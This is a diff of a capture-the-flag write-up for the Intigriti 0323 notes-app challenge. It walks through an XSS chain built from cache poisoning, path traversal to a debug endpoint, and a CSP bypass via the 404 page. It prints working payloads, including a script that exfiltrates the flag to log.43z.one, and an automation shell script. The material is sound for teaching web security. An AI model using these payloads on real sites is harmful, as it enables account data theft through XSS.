@@ -5,23 +5,23 @@ Make sure to follow [h43z](https://twitter.com/h43z) on twitter for more fun stu
 A good start is by just clicking through the UI of https://challenge-0323.intigriti.io/ and trying all the functionalities and look at every URL.
 
  - `https://challenge-0323.intigriti.io/create` create a note with title and content
-  - `https://challenge-0323.intigriti.io/notes` lists notes
+ - `https://challenge-0323.intigriti.io/notes` lists notes
  - `https://challenge-0323.intigriti.io/note/bf8614cc-0da7-407a-b46d-3640d1de0cad?id=bf8614cc-0da7-407a-b46d-3640d1de0cad` shows a specific note
 
-Seems to be very simple note taking app. Without any login. As the server side code is open source (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L57) we see exactly how it works.
+Seems to be very simple note taking app. Without any login. As the server side code is [open source](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L57) we see exactly how it works.
 
 It just creates a session cookie which kind of acts as a "login" to separate users. All notes are cleared from the in memory "database" (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L20) once an hour.
 
 Only who creates a note you will be able to view it too because every note id is a random UUID and you get access to the list of your notes through your own session cookie.
 
-The goal of this challenge will be to steal a FLAG. The flag is a "secret" that is stored in another users note. The other user is represented in this challenge by `bot.js` (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/bot.js). It's a function that gets triggered by the endpoint `/visit?url=https://your_cool_note_link`. 
+The goal of this challenge will be to steal a FLAG. The flag is a "secret" that is stored in another users note. The other user is represented in this challenge by [bot.js](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/bot.js). It's a function that gets triggered by the endpoint `/visit?url=https://your_cool_note_link`. 
 
 If you read the `bot.js` code you can see it's starting an headless chrome instance. Creating the secret flag note and afterwards visiting whatever URL we provided to it.
 
 Ultimately we will need to craft a URL/Website that when given to this bot will somehow read the note with the flag and exfiltrate it back to us, the attacker.
 
 It may be tempting to just host a web page with code like https://editor.43z.one/6hm2c 
-```
+```js
 response = fetch("https://challenge-0323.intigriti.io/notes")
 // then exfiltrate ... 
 ```
@@ -29,7 +29,7 @@ and call it a day. But the modern internet is build upon the concept of the **Sa
 
 ## Excurse into CORS
 But a website operator can configure his server to allow CORS - cross origin resource sharing - by responding with specific headers to allow foreign origins to read the responses. This is exactly what the software engineer of this challenge did here.
-```
+```js
 const URL = "http://127.0.0.1";
 ...
 app.use(
@@ -51,7 +51,7 @@ Imagine a production API running on `https://coolapi.com` and a production web f
 After the developers push their code to production all the requests done on clients from javascript on `coolfrontend.com` will obviously have the origin `https://coolfrontend.com` when hitting `coolapi.com`. So the `coolapi.com` servers will need to get configured and allow CORS from `coolfrontend.com`.
 
 The express cors middleware in this hypothetical scenario would look something like 
-```
+```js
 app.use(
   cors({
     origin: ['http://127.0.0.1', 'https://coolfrontend.com']
@@ -64,7 +64,7 @@ It's always useful to *really* understand what the code does. In the case of thi
 
 ## The idea of a solution
 In order to read the flag we will have to somehow inject code (XSS) into a page that either runs on the origin `127.0.0.1` or `challenge-0323.intigriti.io`. Let's be more clear and check what the `bot.js` actually uses. 
-```
+```js
 const URL = "http://127.0.0.1";
 ...
 await page.goto(`${URL}/create`);
@@ -108,13 +108,13 @@ After clicking a note you created you get to a URL looking like this `https://ch
 That looks weird. You have the note id in the path `/note/bf8614cc-0da7-407a-b46d-3640d1de0cad` and then again as a GET parameter id `?id=bf8614cc-0da7-407a-b46d-3640d1de0cad`. What's going on here?
 
 Inspecting the page source you see that the title of the note is already coming populated from the server `<h2 class="msg-info"> my title </h2><br>` but the note's content is not 
-```
+```html
 <div id="noteContent" class="form-group">
                     {{ body }}
                 </div>
 ```
 If you check the server side code for that route you will see why.
-```
+```js
 app.get("/note/:id", (req, res) => {
 	// TODO: Congifure CORS and setup an allowList
 	let mode = req.headers["mode"];
@@ -129,7 +129,7 @@ app.get("/note/:id", (req, res) => {
 If there is no header key named `mode`  with a value equal to `read` (which there isn't if you just open the url with your browser. It's not a default header a browser sends) it will jump into the else block. Here the templating engine constructs a template named `note` and only feed it with the `title` before it is send to the client.
 
 Obviously if you check the website and not just the initial page source in your browser you can see a note content (or body) there too. But as we just confirmed it's not coming from the initial request. The note content is fetched in `view.js` with javascript after the initial page is loaded.
-```
+```js
     id = params.get("id").trim().replace(/\s\r/,'');
     fetch(`/note/${id}`, {
         method: 'GET',
@@ -154,17 +154,18 @@ And here for the first time things get interesting. We have sink and a source. A
 But that sink is protected with `DOMPurify`. This makes XSS almost impossible.
 
 In a normal flow of the application this  code snipped would fetch a certain id and get into the `if` block on the server.
-```app.get("/note/:id", (req, res) => {
-	// TODO: Congifure CORS and setup an allowList
-	let mode = req.headers["mode"];
-	if (mode === "read") {
-		res.setHeader("content-type", "text/plain"); // no xss	
-		res.send(getPostByID(req.params.id).note);
-	} else {
+```js
+app.get("/note/:id", (req, res) => {
+// TODO: Congifure CORS and setup an allowList
+let mode = req.headers["mode"];
+if (mode === "read") {
+	res.setHeader("content-type", "text/plain"); // no xss	
+	res.send(getPostByID(req.params.id).note);
+} else {
 ```
 
 Because this time the `mode` header was set to `read` by the client side code. 
-`````
+`````js
 fetch(`/note/${id}`, {
         method: 'GET',
         headers: {
@@ -213,18 +214,18 @@ But it has to be said that the behavior is not standardized. Firefox seems to ha
 
 ## Caching in the challenge
 Now what does this all have to do with the challenge?  Remember the `fetch` call.
-`````
+`````js
 fetch(`/note/${id}`, {
         method: 'GET',
         headers: {
             'mode': 'read'
         },
     })
- `````
+`````
 What if if make the bot do this request to a note which holds a payload we prepared. The chrome puppeteer instance then caches the response. Afterwards we make the bot open the note URL directly and hope it will use the cached version.
 
 If it works there will not be another request that get us into the `else` block where we just land in the `DOMpurify` trap again.
-```
+```js
 app.get("/note/:id", (req, res) => {
 	// TODO: Congifure CORS and setup an allowList
 	let mode = req.headers["mode"];
@@ -250,7 +251,7 @@ If there only was a endpoint in the challenge that would return the note and not
 
 Oh look there is one! A debug endpoint which was forgotten to be removed by the developer.
 
-```
+```js
 // DEBUG Endpoints
 // TODO: Remove this before moving to prod
 app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
@@ -284,7 +285,7 @@ into
 `https://challenge-0323.intigriti.io/note/bea5becd-e3bd-4c66-93f5-4e318b97e17d?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`
 
 we used a path traversal "trick" of `../` to get away from the `/note` route that is predefined in the `fetch` call.
-```
+```js
 fetch(`/note/${id}`, {
         method: 'GET',
         headers: {
@@ -306,7 +307,7 @@ Bummer! It's not working. The response does not get pulled from the cache. Maybe
 ![enter image description here](https://imgur.com/MxWllAO.png)
 We can use `httpx` again to test if this is what's causing the trouble here.
 First without using the header in question.
-```
+```js
 const url = `https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=100&body=hello${Date.now()}`
 
 fetch(url)
@@ -361,7 +362,7 @@ And there it gives us the reason why this page was not served from the bfcache.
 
 And by that it probably means bf-cached. All this is thanks to the `debug` endpoint, ``app
 res.status(404).send("404")``
-```
+```js
 app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
   let mode = req.headers["mode"];
   if (mode === "read") {
@@ -396,7 +397,8 @@ Before we can finally craft a payload note that extracts the flag. We will have 
 
 But even before going backward we will also have to create a page that opens the two links before.
 This is how such  page could look like https://editor.43z.one/n97cm
-```
+
+```js
 params = new URL(location).searchParams
 url1 = params.get('url1')
 url2 = params.get('url2')
@@ -419,7 +421,7 @@ We cannot simply use `w.history.go(-2)` because the tab origin and the "exploits
 ## Second stage or how to read the flag
 
 One way to read the bots secret note is to put following code into our payload note.
-```
+```html
 
 <script>
 	r = fetch("http://127.0.0.1/notes").then(x => x.text()).then(console.log)
@@ -444,7 +446,7 @@ object-src 'none';
 The script source can only be `self` no inline scripts are allowed.
 
 Good that there is an injection possibility in the 404 endpoint.
-```
+```js
  app.get("*", (req, res) => {
   res.setHeader("content-type", "text/plain"); // no xss)
   res.status = 404;
@@ -461,7 +463,7 @@ The developers comment `  res.setHeader("content-type", "text/plain"); // no xss
 
 We cas use `httpx` to confirm this https://editor.43z.one/4xjv4
 
-```
+```html
 <script src="//httpx.43z.one?status=200&content-type=text/plain&body=alert(1)"></script>
 ```
 shows an alert. 
@@ -474,16 +476,16 @@ You can confirm this with `httpx` again, by switching `?status=200` with `?statu
 To turn the `404 - /noneexistingpath` into valid javascript we simply choose a path like `a/;alert(1)`
 
 This way the response becomes `404 - /a/;alert(1)`. A number (404) minus a regex (/a/). Then our actual payload can follow. https://editor.43z.one/vndh9
-```
+```html
 <script src="https://challenge-0323.intigriti.io/a/;alert(1)"></script>
 ```
 But we will run into trouble if we use a more complex payload. Like the initial idea of
 
-```
+```js
 r=fetch('http://127.0.0.1/notes').then(x=>x.text()).then(console.log)
 ```
 The the `encodeURI` would turn it into 
-```
+```js
 r=fetch('http://127.0.0.1/notes').then(x=%3Ex.text()).then(console.log)
 ```
 It encodes all characters except 
@@ -499,7 +501,7 @@ There is an alternative though to using javascript and `fetch`.
 The CSP says `frame-src 'self'; ` we can just an `iframe` and frame the `/notes` endpoint this way we don't have to use all the code for `fetch()` and just access it directly via the html element.
 The iframe is on the same origin as the payload note itself so it should be no problem to access the content of the iframe.
 
-```
+```html
 <iframe id=i src=http://127.0.0.1/notes></iframe>
 <script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
 ```
@@ -536,7 +538,7 @@ But there is another neat trick to delay the javascript execution. By placing a 
 style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
 ```
 If we run this test payload note
-```
+```html
 <iframe id=i src=http://127.0.0.1/notes></iframe>
 <style>@import '//fonts.gstatic.com'</style>
 <script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
@@ -548,7 +550,7 @@ we will alert the flag URL. Now we just have to exfiltrate it back to us. We do 
 
 # Final instructions
 1. create the note with the content and call the note id of it **PAYLOAD_ID**
-```
+```html
 <iframe id=i src=http://127.0.0.1/notes></iframe>
 <style>@import '//fonts.gstatic.com'</style>
 <script src="http://127.0.0.1/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href)"></script>
@@ -560,7 +562,7 @@ we will alert the flag URL. Now we just have to exfiltrate it back to us. We do 
 
 4. Construct a web page with the following content and name it's URL **FIRST_STAGE**
 
-```
+```js
 params = new URL(location).searchParams
 url1 = params.get('url1')
 url2 = params.get('url2')
@@ -586,7 +588,7 @@ Here is how it looks exploiting the challenge locally with the setting `headless
 ![enter image description here](https://imgur.com/Imt05NF.png)
 
 Here the final script that does all the tasks we did manually before.
-```
+```sh
 #!/bin/sh
 # dependencies curl, pup, jq
 
@@ -614,7 +616,6 @@ encoded="$(echo "https://editor.43z.one/kczdj/i?url1=$ENDPOINT/debug/52abd8b5-3a
 
 # append the FULL URL to the /visit endpoint
 echo "$CHALLENGE/visit?url=$encoded"
-
 ```
 
 
